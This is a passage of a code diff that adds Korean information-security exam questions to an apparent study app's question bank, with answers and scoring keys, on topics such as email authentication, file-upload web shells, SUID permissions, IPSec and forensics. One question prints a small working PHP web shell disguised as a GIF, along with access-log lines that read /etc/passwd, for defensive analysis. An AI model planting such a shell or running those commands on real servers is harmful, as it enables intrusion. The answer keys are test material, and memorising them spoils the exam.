+        T_ATK -->|"패킷2: Offset 50~150 (오프셋 겹침)"| T_VIC
+        T_VIC -->|"재조합 단계 메모리 왜곡 ➔ 크래시"| CRASH["블루스크린 / 커널 패닉"]
+    end`,
+  },
+
+  // =================================================================
+  // [문제 113] 서술·작업형 (14점) - 네트워크 & 애플리케이션 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 113,
+    subjectId: "network",
+    type: "descriptive",
+    score: 14,
+    domain: "네트워크 & 애플리케이션 보안",
+    title: "이메일 스푸핑 방지 3대 메커니즘 (SPF, DKIM, DMARC) 분석 및 DNS 질의",
+    description:
+      "최근 피싱 및 이메일 발신자 명의 도용을 방지하기 위해 널리 적용되는 이메일 인증 표준 기술 3가지(SPF, DKIM, DMARC)에 관한 실무 서술형 물음이다. 하위 4가지 질문에 답하시오.",
+    codeBlock: {
+      language: "bind",
+      code: `; 도메인 example.com의 공인 DNS 설정 내용
+example.com.   IN  TXT  "v=spf1 ip4:203.0.113.10 include:_spf.google.com ~all"
+default._domainkey.example.com. IN TXT ( "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQ..." )
+_dmarc.example.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com; pct=100"`,
+    },
+    subItems: [
+      {
+        number: 1,
+        question:
+          "수신 메일 서버가 발신 메일의 위조 여부를 판단하기 위해 SPF(Sender Policy Framework) 검증 시 대조·확인하는 발신자 패킷의 핵심 정보를 기술하시오.",
+        answer: "실제 메일을 발송한 발신 메일 서버의 IP 주소 (발신 IP)",
+        scoringCriteria: "발신 메일 서버의 IP 주소 명시 시 3점",
+      },
+      {
+        number: 2,
+        question:
+          "수신 메일 서버가 발신 도메인의 SPF 정책 및 등록된 메일 서버 목록을 확인하기 위해 DNS 서버에 질의하는 레코드 유형을 기술하시오.",
+        answer: "DNS TXT 레코드 (또는 SPF 레코드)",
+        scoringCriteria: "DNS TXT 레코드 명시 시 3점",
+      },
+      {
+        number: 3,
+        question:
+          "DKIM(DomainKeys Identified Mail) 검증을 위해 발신 도메인 관리자가 이메일 전자서명 검증용 공개키(Public Key)를 수신 서버 측과 공유하는 방법을 기술하시오.",
+        answer:
+          "발신자 도메인의 DNS 서버에 DKIM 전용 TXT 레코드(선택자._domainkey.도메인)를 생성하고 그 값으로 공개키를 등록하여 공개한다.",
+        scoringCriteria:
+          "발신 도메인의 DNS TXT 레코드에 공개키 등록 공유 명시 시 4점",
+      },
+      {
+        number: 4,
+        question:
+          "SPF와 DKIM 인증 결과를 종합 검토하여 인증 실패 시 처리 정책(none, quarantine, reject)을 선언하고 집계 리포트를 수신하는 메일 인증 표준 프로토콜 명칭을 기술하시오.",
+        answer: "DMARC (Domain-based Message Authentication, Reporting and Conformance)",
+        scoringCriteria: "DMARC 정확히 기술 시 4점",
+      },
+    ],
+    answer: [
+      "1. SPF 검증 대상: 발신 메일 서버의 IP 주소",
+      "2. DNS 질의 유형: DNS TXT 레코드 질의",
+      "3. DKIM 공개키 공유: 발신 도메인의 DNS TXT 레코드에 공개키 등록",
+      "4. 통합 정책 프로토콜: DMARC",
+    ],
+    scoringPoints: [
+      "1번: 발신 메일 서버 IP 주소 (3점)",
+      "2번: DNS TXT 레코드 (3점)",
+      "3번: 발신자 DNS TXT 레코드에 공개키 등록 (4점)",
+      "4번: DMARC 명칭 (4점)",
+    ],
+    explanation:
+      "• SPF (Sender Policy Framework):\n도메인 소유자가 자신의 공인 DNS TXT 레코드에 합법적으로 메일을 발송할 수 있는 메일 서버 IP들을 선언해 둡니다. 수신 서버는 SMTP 연결 시 발신자의 실제 접속 IP를 DNS SPF 레코드와 대조합니다.\n• DKIM (DomainKeys Identified Mail):\n발신 메일 서버가 메일 헤더를 비밀키로 전자서명(`DKIM-Signature`)하여 전송하고, 수신 서버는 발신자의 DNS TXT 레코드에서 공개키를 조회하여 메일 본문의 위·변조 여부를 암호학적으로 검증합니다.\n• DMARC:\nSPF와 DKIM 검증 결과를 수신 서버가 어떻게 처리할지 발신자가 DNS `_dmarc` TXT 레코드로 정책(`p=none` 모니터링, `p=quarantine` 스팸함 격리, `p=reject` 수신 거부)을 강제합니다.",
+    examTips:
+      "2026년 2회차 실기 서술형 13번 기출입니다. 최신 정부 및 포털의 메일 보안 가이드 핵심으로 SPF, DKIM, DMARC 3단계 관계를 완벽히 숙지해야 합니다.",
+    mermaidChart: `sequenceDiagram
+    autonumber
+    actor Attacker as 공격자 (위조 메일)
+    participant Receiver as 수신 메일 서버
+    participant DNS as 발신 도메인 공인 DNS
+
+    Attacker->>Receiver: 위조 메일 발송 (From: ceo@example.com)
+    Note over Receiver: 메일 수신 후 SPF/DKIM/DMARC 검증 착수
+    Receiver->>DNS: example.com의 TXT (SPF) 레코드 질의
+    DNS-->>Receiver: 허용 IP: 203.0.113.10
+    Note over Receiver: 발신 IP 불일치 ➔ SPF FAIL 판정!
+    Receiver->>DNS: _domainkey의 TXT (DKIM) 공개키 질의
+    DNS-->>Receiver: DKIM 공개키 응답
+    Note over Receiver: 전자서명 검증 실패 ➔ DKIM FAIL 판정!
+    Receiver->>DNS: _dmarc.example.com TXT 레코드 질의
+    DNS-->>Receiver: 정책 선언: p=reject (수신 거부)
+    Receiver-->>Attacker: 550 Message Rejected (위조 메일 즉시 폐기)`,
+  },
+
+  // =================================================================
+  // [문제 114] 서술·작업형 (14점) - 애플리케이션 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 114,
+    subjectId: "application",
+    type: "descriptive",
+    score: 14,
+    domain: "애플리케이션 보안",
+    title: "웹 서버 파일 업로드 취약점(웹쉘) 분석 및 4대 다계층 보안 대책",
+    description:
+      "웹 서버 침해사고 분석 과정에서 발견된 악성 첨부파일과 웹 서버 접근 로그이다. 제시된 데이터를 분석하여 침해 공격 유형을 식별하고, 침해 재발을 원천 차단하기 위한 4대 보안 대책을 기술하시오.",
+    codeBlock: {
+      language: "http",
+      code: `# 웹 서버(Nginx/Apache) Access Log
+198.51.100.25 - - [08/Nov/2026:14:22:10 +0900] "POST /board/upload_action.php HTTP/1.1" 200 412
+198.51.100.25 - - [08/Nov/2026:14:23:05 +0900] "GET /uploads/shell.php.jpg?cmd=id HTTP/1.1" 200 84
+198.51.100.25 - - [08/Nov/2026:14:23:18 +0900] "GET /uploads/shell.php.jpg?cmd=cat%20/etc/passwd HTTP/1.1" 200 2410
+
+# 업로드된 파일(/uploads/shell.php.jpg) 내부 내용
+GIF89a
+<?php
+  if(isset($_REQUEST['cmd'])){
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+  }
+?>`,
+    },
+    subItems: [
+      {
+        number: 1,
+        question:
+          "위 로그와 파일 내용을 바탕으로 공격자가 감행한 침해사고의 공격 기법 명칭과, 업로드된 파일의 악성 유형을 기술하시오.",
+        answer:
+          "• 공격 기법: 파일 업로드 취약점(File Upload Vulnerability)을 이용한 다중 확장자(또는 헤더 위조) 우회 공격\n• 파일 악성 유형: 웹쉘(WebShell)",
+        scoringCriteria:
+          "파일 업로드 취약점(2점), 웹쉘(WebShell)(3점) -> 총 5점",
+      },
+      {
+        number: 2,
+        question:
+          "웹 애플리케이션 및 웹 서버 인프라 관점에서 파일 업로드 취약점을 원천 방어하기 위한 4대 보안 대책을 구체적으로 서술하시오.",
+        answer:
+          "1. 파일 확장자 화이트리스트 검증: 블랙리스트 방식이 아닌, 서버 측에서 안전한 확장자(jpg, png, pdf 등)만을 화이트리스트로 엄격히 검증한다.\n2. 업로드 디렉터리 실행 권한(Execute) 제거: 웹 서버 설정(Apache의 `php_flag engine off`, Nginx의 `location` 내 php 차단 등)을 통해 첨부파일 저장 경로 내 스크립트 실행 권한을 원천 박탈한다.\n3. 업로드 디렉터리를 웹 루트(DocumentRoot) 외부에 위치: 외부 웹 브라우저 URL로 직접 호출할 수 없는 디렉터리에 저장하고, 다운로드 스크립트를 통해서만 파일을 전달한다.\n4. 저장 파일명 및 확장자 난수화(UUID 변환): 원본 파일명을 그대로 쓰지 않고 UUID나 무작위 해시값으로 파일명을 변환 저장하여 공격자가 실행 경로를 유추할 수 없도록 한다.",
+        scoringCriteria:
+          "화이트리스트 확장자 검증, 업로드 경로 실행권한 제거, 웹루트 외부 저장, 파일명 난수화 중 4가지 서술 시 각 2.25점씩 총 9점",
+      },
+    ],
+    answer: [
+      "1. 공격 유형: 파일 업로드 취약점을 이용한 웹쉘(WebShell) 업로드 공격",
+      "2. 4대 보안 대책:\n - 확장자 화이트리스트 검증\n - 업로드 디렉터리 실행 권한(Execute) 제거\n - 업로드 파일을 웹 루트(DocumentRoot) 외부에 저장\n - 파일명 및 확장자 난수화(UUID) 처리",
+    ],
+    scoringPoints: [
+      "공격 기법 및 웹쉘 식별 (5점)",
+      "4대 방어 대책 (화이트리스트, 실행권한 제거, 웹루트 외부화, 난수화) 각 2~3점 (9점)",
+    ],
+    explanation:
+      "• 로그 분석:\n공격자는 매직 넘버(GIF89a)를 삽입하여 이미지 파일로 위장한 후 이중 확장자(`shell.php.jpg`) 형태로 웹쉘을 업로드하였고, 이후 `?cmd=cat /etc/passwd`를 통해 OS 명령어를 원격 실행하였습니다.\n• 다계층 방어:\n어느 한 계층이 뚫리더라도 다음 계층에서 공격을 무력화할 수 있도록 확장자 검증(코드 레벨), 실행권한 차단(웹서버 레벨), 저장 위치 격리(OS 레벨), 파일명 난수화(데이터 레벨)를 병행해야 합니다.",
+    examTips:
+      "2026년 2회차 실기 서술형 14번 기출입니다. 실무 웹쉘 방어의 표준 4대 대책은 서술형 및 실무형 문제로 매년 반복 출제됩니다.",
+  },
+
+  // =================================================================
+  // [문제 115] 서술·작업형 (14점) - 시스템 보안 (2026년 2회차 실기 기출)
+  // =================================================================
+  {
+    id: 115,
+    subjectId: "system",
+    type: "descriptive",
+    score: 14,
+    domain: "시스템 보안",
+    title: "특수 권한(SUID / SGID) 취약점 관리 및 권한 상승(Privilege Escalation) 방어",
+    description:
+      "리눅스 시스템에서 특수 권한인 SetUID 및 SetGID가 부여된 실행 파일의 보안 관리 및 취약점 점검에 관한 실무 서술형 물음이다. 하위 3가지 물음에 답하시오.",
+    codeBlock: {
+      language: "bash",
+      code: `# 시스템 점검 스크립트 실행 로그
+-rwsr-xr-x 1 root root  68248 Mar 15 2026 /usr/bin/passwd
+-rwsr-xr-x 1 root root 149080 Jan 10 2026 /tmp/backdoor_shell
+-rwxr-sr-x 1 root tty    34896 Feb 20 2026 /usr/bin/wall`,
+    },
+    subItems: [
+      {
+        number: 1,
+        question:
+          "관리자의 관리 미흡으로 인해 불필요한 바이너리나 임시 디렉터리(/tmp 등) 내 파일에 SUID(SetUID) 권한이 설정되어 있을 때 발생하는 보안 위험을 서술하시오.",
+        answer:
+          "일반 사용자가 해당 파일을 실행하는 순간 파일 소유자(통상 root 관리자)의 권한으로 프로세스가 동작하므로, 파일 내부의 버퍼 오버플로우나 셸 이스케이프(Shell Escape) 취약점을 악용하여 관리자 쉘을 획득하는 권한 상승(Privilege Escalation) 및 시스템 완전 장악 위험이 발생한다.",
+        scoringCriteria:
+          "소유자(root) 권한으로 프로세스 실행, 권한 상승(Privilege Escalation), 시스템 장악 위험 서술 시 4점",
+      },
+      {
+        number: 2,
+        question:
+          "불필요한 파일(예: `/tmp/backdoor_shell`)에서 SUID 권한만을 안전하게 제거하는 리눅스 chmod 명령어 구문과, SGID 권한만을 제거하는 명령어 구문을 각각 기술하시오.",
+        answer:
+          "• SUID 제거: `chmod u-s /tmp/backdoor_shell` (또는 `chmod 0755 ...`)\n• SGID 제거: `chmod g-s /tmp/backdoor_shell`",
+        scoringCriteria:
+          "SUID 제거 `chmod u-s` (2.5점), SGID 제거 `chmod g-s` (2.5점) -> 총 5점",
+      },
+      {
+        number: 3,
+        question:
+          "시스템 관리자가 전체 파일시스템 루트(/)부터 검색하여 SUID 특수 권한(4000)이 부여된 모든 일반 파일을 탐색하는 리눅스 find 명령어 구문을 작성하시오.",
+        answer: "find / -perm -4000 (또는 find / -perm /4000, find / -type f -perm -4000)",
+        scoringCriteria:
+          "`find / -perm -4000` (또는 `/4000`) 정확히 작성 시 5점",
+      },
+    ],
+    answer: [
+      "1. 보안 위험: 일반 사용자가 소유자(root) 권한으로 실행되어 권한 상승(Privilege Escalation) 및 시스템 탈취 위험",
+      "2. 권한 제거 명령어: SUID 제거 `chmod u-s <파일명>`, SGID 제거 `chmod g-s <파일명>`",
+      "3. 탐색 find 명령어: `find / -perm -4000` (또는 `find / -type f -perm -4000`)",
+    ],
+    scoringPoints: [
+      "권한 상승(Privilege Escalation) 및 시스템 탈취 위험 명시 (4점)",
+      "SUID 제거(u-s) 및 SGID 제거(g-s) 명령어 (5점)",
+      "SUID 파일 검색 find 명령어(`find / -perm -4000`) (5점)",
+    ],
+    explanation:
+      "• SetUID(4000) 동작 메커니즘:\n일반 사용자가 `/usr/bin/passwd`를 실행하여 자신의 비밀번호를 바꿀 수 있는 이유는 passwd 바이너리에 SetUID가 설정되어 있어 실행 중 일시적으로 root 권한을 획득하기 때문입니다.\n• 취약점 점검 및 보안 가이드:\n주요정보통신기반시설 기술적 취약점 분석 가이드에서는 주기적으로 `find / -perm -4000` 명령어를 수행하여 기본 필수 바이너리(passwd, su, ping 등) 외에 관리자가 알지 못하거나 비인가 생성된 SUID 파일(특히 /tmp, /dev 등 임시 디렉터리 내)을 식별하고 즉시 `chmod u-s`로 권한을 박탈하도록 규정하고 있습니다.",
+    examTips:
+      "2026년 2회차 실기 서술형 15번 기출입니다. 권한 상승 위험, 제거 명령어(chmod u-s), 탐색 명령어(find / -perm -4000)를 완벽한 명령줄 문법으로 외우세요.",
+  },
+
+  // =================================================================
+  // [문제 116] 단답형 (3점) - 시스템 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 116,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Linux /etc/shadow 패스워드 해시 포맷 및 필드 분석",
+    description:
+      "Linux 시스템의 `/etc/shadow` 파일에서 패스워드 항목이 아래와 같이 설정되어 있다. 제시된 설정에서 (1) `$6$`이 의미하는 암호화 해시 알고리즘, (2) 달러 기호 사이 값(`saltstring`)의 명칭과 역할, (3) 6번째 필드의 숫자 `7`이 의미하는 바를 각각 쓰시오.",
+    scenario: "root:$6$saltstring$encryptedhash:19800:0:99999:7:::",
+    answer: [
+      "(1) $6$: SHA-512 해시 알고리즘",
+      "(2) saltstring: 솔트(Salt) (레인보우 테이블 공격 무력화 및 동일 패스워드의 서로 다른 해시값 생성)",
+      "(3) 숫자 7: 패스워드 만료 전 경고 일수 (패스워드 만료 7일 전부터 로그인 시 경고 메시지 출력)",
+    ],
+    scoringPoints: [
+      "(1) SHA-512 (1점)",
+      "(2) 솔트(Salt) 및 역할 (1점)",
+      "(3) 만료 전 경고 일수 (1점)",
+    ],
+    explanation:
+      "• `/etc/shadow` 구조:\n`계정명:패스워드해시:최종변경일:최소일수:최대일수:경고일수:비활성일수:만료일수:예약`의 9개 필드로 구성됩니다.\n• 해시 포맷 `$id$salt$hash`:\n`$1`=MD5, `$2a`=Blowfish, `$5`=SHA-256, `$6`=SHA-512, `$y`=yescrypt를 의미합니다. 솔트(Salt)는 무작위 문자열을 평문에 덧붙여 해싱함으로써 사전 공격과 레인보우 테이블을 무력화합니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 1번 기출입니다. shadow 파일의 9개 필드 순서와 해시 식별자 번호($1, $5, $6)는 단답형 단골입니다.",
+  },
+
+  // =================================================================
+  // [문제 117] 단답형 (3점) - 네트워크 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 117,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "IPSec 보안 프로토콜 (ESP) 및 Replay Attack 방어",
+    description:
+      "다음 물음에 적합한 IPSec 프로토콜 헤더 명칭과 헤더 필드를 기술하시오.\n(1) IP 패킷의 데이터 암호화(기밀성)와 무결성/인증을 동시에 제공하는 프로토콜 헤더\n(2) IPSec 통신 중 공격자가 이전 패킷을 도청해 그대로 재전송하는 Replay Attack을 방어하기 위해 사용하는 헤더 필드",
+    answer: [
+      "(1) ESP (Encapsulating Security Payload)",
+      "(2) 시퀀스 넘버 (Sequence Number)",
+    ],
+    scoringPoints: [
+      "(1) ESP 명칭 (1.5점)",
+      "(2) 시퀀스 넘버 (또는 Sequence Number) (1.5점)",
+    ],
+    explanation:
+      "• AH vs ESP:\nAH(Authentication Header)는 무결성과 인증, 재전송 방지를 제공하지만 '기밀성(암호화)'은 제공하지 않습니다. 기밀성과 무결성을 동시 제공하려면 ESP를 사용해야 합니다.\n• 재전송 방지(Anti-Replay):\nESP/AH 헤더의 32비트 시퀀스 넘버(Sequence Number)와 수신측의 슬라이딩 윈도우(Sliding Window) 메커니즘을 결합하여 이미 수신된 패킷의 재전송을 자동 폐기합니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 2번 기출입니다. AH와 ESP의 기능 차이 및 시퀀스 넘버 역할을 명확히 기억하세요.",
+  },
+
+  // =================================================================
+  // [문제 118] 단답형 (3점) - 시스템 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 118,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Windows 원격 세션 관리 및 강제 종료 CLI 명령어",
+    description:
+      "Windows 서버에서 현재 원격 접속된 세션 목록을 조회하고, 특정 세션을 강제 종료하기 위해 사용하는 CLI 명령어를 기술하시오.",
+    answer: [
+      "세션 목록 조회: net session",
+      "세션 강제 종료: net session \\\\컴퓨터명 /delete",
+    ],
+    scoringPoints: [
+      "`net session` 명령어 (2점)",
+      "강제 종료 옵션 `/delete` 구문 (1점)",
+    ],
+    explanation:
+      "• `net session`:\n서버 컴퓨터와 클라이언트 간에 설정된 모든 활성 세션을 표시합니다.\n• 세션 종료 구문:\n`net session \\\\컴퓨터명 /delete` 명령을 내리면 해당 클라이언트 컴퓨터와의 세션을 즉시 연결 해제하고 열려 있는 파일들을 닫습니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 3번 기출입니다. Windows net 계열 명령(`net session`, `net use`, `net share`, `net user`)의 쓰임새를 구분해야 합니다.",
+  },
+
+  // =================================================================
+  // [문제 119] 단답형 (3점) - 애플리케이션 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 119,
+    subjectId: "application",
+    type: "short",
+    score: 3,
+    domain: "애플리케이션 보안",
+    title: "유출 계정 정보 재사용을 악용한 크리덴셜 스터핑 (Credential Stuffing)",
+    description:
+      "타 사이트 침해사고로 이미 유출된 대량의 아이디(ID)와 비밀번호 목록을 자동화 도구로 다른 포털이나 금융 사이트에 대량 대입하여, 사용자가 여러 사이트에서 동일한 계정 정보를 재사용한다는 보안 약점을 악용하는 로그인 공격 기법의 명칭을 쓰시오.",
+    answer: ["크리덴셜 스터핑 (Credential Stuffing)"],
+    scoringPoints: [
+      "크리덴셜 스터핑(Credential Stuffing) 정확히 기재 시 3점",
+    ],
+    explanation:
+      "• 공격 원리:\n사용자들이 동일한 ID와 패스워드를 여러 사이트에서 재사용한다는 습성을 악용합니다. 공격자는 다크웹 등에서 입수한 계정 DB(콤보 리스트)를 봇넷을 통해 타깃 사이트에 무차별 대입합니다.\n• 방어 대책:\n다중 요소 인증(MFA), 로그인 캡차(CAPTCHA), 비정상 IP/디바이스 로그인 탐지, 유출 패스워드 블랙리스트 대조가 필요합니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 4번 기출입니다. 브루트 포스(단일 계정에 비밀번호 무차별 대입)와 크리덴셜 스터핑(유출된 다수 계정-비밀번호 쌍 대입)의 차이점을 서술할 수 있어야 합니다.",
+  },
+
+  // =================================================================
+  // [문제 120] 단답형 (3점) - 정보보안 일반 & 암호학 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 120,
+    subjectId: "general",
+    type: "short",
+    score: 3,
+    domain: "정보보안 일반 & 암호학",
+    title: "데이터 비식별화 마스킹 기법 (정적 마스킹 vs 동적 마스킹)",
+    description:
+      "데이터베이스 보안 및 개인정보 비식별 조치 가이드라인에 따른 데이터 마스킹 기술에 관한 물음이다. (1)과 (2)에 해당하는 용어를 각각 쓰시오.\n(1) 운영 DB에서 테스트, 개발 환경으로 데이터를 복제하기 전 사전에 영구적으로 가짜 값으로 일괄 변환하는 방식\n(2) 실제 원본 데이터는 유지한 채 사용자의 접근 권한이나 요청 쿼리에 따라 실시간으로 마스킹하여 반환하는 방식",
+    answer: [
+      "(1) 정적 데이터 마스킹 (SDM: Static Data Masking)",
+      "(2) 동적 데이터 마스킹 (DDM: Dynamic Data Masking)",
+    ],
+    scoringPoints: [
+      "(1) 정적 데이터 마스킹 (SDM) (1.5점)",
+      "(2) 동적 데이터 마스킹 (DDM) (1.5점)",
+    ],
+    explanation:
+      "• 정적 데이터 마스킹 (SDM):\n원본 데이터를 다른 비운영 환경(개발, QA, 분석)으로 이관할 때 영구적으로 가명·익명 처리하여 사본을 만듭니다. 원본 복구가 불가능합니다.\n• 동적 데이터 마스킹 (DDM):\n원본 데이터는 그대로 보존되며, 데이터베이스 프록시나 뷰 엔진이 사용자의 인가 등급에 따라 쿼리 응답 시 주민번호 뒷자리를 `******`처럼 실시간 변환하여 노출합니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 5번 기출입니다. 개인정보보호법 비식별 조치 및 DB 접근제어 솔루션과 연계되어 자주 출제됩니다.",
+  },
+
+  // =================================================================
+  // [문제 121] 단답형 (3점) - 시스템 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 121,
+    subjectId: "system",
+    type: "short",
+    score: 3,
+    domain: "시스템 보안",
+    title: "Windows 공유 폴더 및 기본 관리 숨김 공유 확인 명령어",
+    description:
+      "Windows 명령 프롬프트(CMD) 환경에서 현재 시스템에 설정된 공유 디렉터리 및 관리 숨김 공유(`C$`, `ADMIN$`, `IPC$` 등) 목록을 확인하는 명령어는?",
+    answer: ["net share"],
+    scoringPoints: ["`net share` 명령어 정확히 기재 시 3점"],
+    explanation:
+      "• `net share`:\n현재 로컬 컴퓨터에서 네트워크를 통해 공유되고 있는 모든 리소스 목록을 출력합니다.\n• 보안 조치:\n기본 관리 공유(`C$`, `ADMIN$`)는 침해사고 시 랜섬웨어나 악성코드의 SMB 측면 이동(Lateral Movement) 경로로 악용되므로, `net share C$ /delete`로 제거하거나 레지스트리 `AutoShareServer=0` 설정을 통해 비활성화해야 합니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 6번 기출입니다. 주요기반시설 취약점 분석 가이드 Windows 서버 편의 기본 공유 제거 점검 항목과 직결됩니다.",
+  },
+
+  // =================================================================
+  // [문제 122] 단답형 (3점) - 네트워크 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 122,
+    subjectId: "network",
+    type: "short",
+    score: 3,
+    domain: "네트워크 보안",
+    title: "L2 스위치 프레임 포워딩 방식 3종 (Cut-Through, Store-and-Forward, Fragment-Free)",
+    description:
+      "L2 스위치가 수신한 이더넷 프레임을 목적지 포트로 전달하는 포워딩 방식 3종에 대한 설명이다. 빈칸에 들어갈 방식을 기술하시오.\n(1) 목적지 MAC 주소(초기 6바이트)만 읽고 즉시 포워딩하는 방식\n(2) 프레임 전체를 버퍼에 저장하고 CRC 오류 검증을 완료한 후 포워딩하는 방식\n(3) 충돌 방지를 위해 이더넷 최소 프레임 크기인 64바이트까지만 검사 후 포워딩하는 방식",
+    answer: [
+      "(1) Cut-Through (컷스루)",
+      "(2) Store-and-Forward (스토어 앤 포워드 / 저장 후 전달)",
+      "(3) Fragment-Free (프래그먼트 프리 / 변형 컷스루)",
+    ],
+    scoringPoints: [
+      "(1) Cut-Through (1점)",
+      "(2) Store-and-Forward (1점)",
+      "(3) Fragment-Free (1점)",
+    ],
+    explanation:
+      "• Cut-Through: 지연 시간(Latency)이 가장 짧으나 에러 검출이 불가능하여 오류 프레임까지 전송함.\n• Store-and-Forward: 전체 프레임을 받아 FCS(CRC)를 검증하므로 신뢰성이 가장 높으나 처리 지연이 큼.\n• Fragment-Free: 충돌로 인해 발생하는 64바이트 미만의 런트(Runt) 프레임을 걸러내면서도 지연을 줄인 절충 방식.",
+    examTips:
+      "2025년 3회차 실기 단답형 7번 기출입니다. 처리 지연과 에러 검출 능력 간의 트레이드오프 관계를 숙지하세요.",
+  },
+
+  // =================================================================
+  // [문제 123] 단답형 (3점) - 애플리케이션 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 123,
+    subjectId: "application",
+    type: "short",
+    score: 3,
+    domain: "애플리케이션 보안",
+    title: "제로데이 공격(Zero-Day) 및 경로 조작(Path Traversal) 취약점",
+    description:
+      "다음 각 설명에 해당하는 보안 용어 및 웹 애플리케이션 취약점 명칭을 쓰시오.\n(1) 소프트웨어 개발사의 공식 보안 패치가 발표되기 전에 취약점을 악용하여 공격하는 형태\n(2) 파일 다운로드나 요청 파라미터에 `../` 문자열을 주입하여 웹 루트 상위의 비인가 중요 파일(`/etc/passwd` 등)에 접근하는 취약점",
+    answer: [
+      "(1) 제로데이 공격 (Zero-Day Attack)",
+      "(2) 경로 조작 (Path Traversal / Directory Traversal)",
+    ],
+    scoringPoints: [
+      "(1) 제로데이 공격 (Zero-Day) (1.5점)",
+      "(2) 경로 조작 (Path Traversal / 디렉터리 접근) (1.5점)",
+    ],
+    explanation:
+      "• Zero-Day Attack: 패치가 없는 취약점을 노리므로 시그니처 기반 방화벽으로 탐지가 어렵고 샌드박스나 EDR 등 행위 기반 분석이 필수적입니다.\n• Path Traversal: `../`나 URL 인코딩(`%2e%2e%2f`)을 통해 허용된 디렉터리 경계를 벗어나는 취약점으로, 파일명에서 `..`, `/`, `\\`를 제거하거나 화이트리스트 파일 인덱스를 사용하는 방식으로 방어합니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 8번 기출입니다. 기본 웹 공격 유형과 방어 코딩을 연결하여 학습하세요.",
+  },
+
+  // =================================================================
+  // [문제 124] 단답형 (3점) - 정보보안 관리 및 법률 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 124,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리 및 법률",
+    title: "디지털 포렌식 (Digital Forensics) 개념 및 증거 수집 원칙",
+    description:
+      "전자적 증거를 법적 증거 능력을 갖추도록 과학적·체계적으로 수집, 분석, 보존하는 절차 및 학문 분야의 명칭과, 증거 수집 과정에서 최초 상태가 변조되지 않아야 한다는 포렌식 기본 원칙을 기술하시오.",
+    answer: [
+      "학문 분야 명칭: 디지털 포렌식 (Digital Forensics)",
+      "변조 방지 원칙: 무결성의 원칙",
+    ],
+    scoringPoints: [
+      "디지털 포렌식 (Digital Forensics) (1.5점)",
+      "무결성의 원칙 (1.5점)",
+    ],
+    explanation:
+      "• 디지털 포렌식 5대 기본 원칙:\n1. 정당성의 원칙 (적법 절차에 따른 증거 수집)\n2. 재현성의 원칙 (동일한 조건에서 동일한 결과 도출)\n3. 신속성의 원칙 (휘발성 증거의 신속한 확보)\n4. 연계보관성의 원칙 (Chain of Custody, 수집·이송·분석 전 과정의 기록)\n5. 무결성의 원칙 (증거 수집 후 법정 제출까지 위·변조 없음 입증, 해시값 검증)",
+    examTips:
+      "2025년 3회차 실기 단답형 9번 기출입니다. 포렌식 5대 원칙은 단답형뿐 아니라 서술형으로도 자주 출제됩니다.",
+  },
+
+  // =================================================================
+  // [문제 125] 단답형 (3점) - 정보보안 관리 및 법률 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 125,
+    subjectId: "law",
+    type: "short",
+    score: 3,
+    domain: "정보보안 관리 및 법률",
+    title: "정성적 위험분석 - 델파이 기법 (Delphi Technique)",
+    description:
+      "보안 위험 평가 기법 중 여러 보안 전문가들에게 익명의 설문지를 발송하고, 그 결과를 종합하여 재배포하는 피드백 과정을 반복함으로써 주관적 편견을 배제하고 전문가 집단의 합의를 도출하는 정성적 위험분석 기법은?",
+    answer: ["델파이 기법 (Delphi Technique)"],
+    scoringPoints: ["델파이 기법 (Delphi Technique) 정확히 기재 시 3점"],
+    explanation:
+      "• 델파이 기법 (Delphi Technique):\n전문가들이 대면하지 않고 익명으로 설문 조사에 응답하도록 하여, 특정 권위자의 영향력이나 다수 의견에 휩쓸리는 그룹 싱크(Groupthink) 편향을 차단하고 신뢰성 높은 합의를 도출합니다.\n• 정성적 위험분석 종류: 델파이 기법, 브레인스토밍, 시나리오 플래닝, 순위결정법 등이 있습니다.",
+    examTips:
+      "2025년 3회차 실기 단답형 10번 기출입니다. 정량적 분석(ALE, SLE, ARO)과 정성적 분석(델파이, 시나리오)의 분류를 명확히 하세요.",
+  },
+
+  // =================================================================
+  // [문제 126] 서술·실무형 (14점) - 시스템 보안 (2025년 3회차 실기 기출)
+  // =================================================================
+  {
+    id: 126,
+    subjectId: "system",
+    type: "descriptive",
+    score: 14,
+    domain: "시스템 보안",
+    title: "통합 인증 및 전사 계정 거버넌스 아키텍처 (SSO vs EAM vs IAM) 비교 서술",
+    description:
+      "기업의 정보보호 아키텍처에서 사용자 인증 및 접근 권한 통제를 위한 통합 솔루션인 SSO, EAM, IAM의 개념과 엔터프라이즈 환경에서의 역할 차이를 비교 서술하시오.",
+    subItems: [
+      {
+        number: 1,
+        question:
+          "SSO (Single Sign-On)의 개념과 사용자 편의성 및 보안 관리 측면의 장점을 기술하시오.",
+        answer:
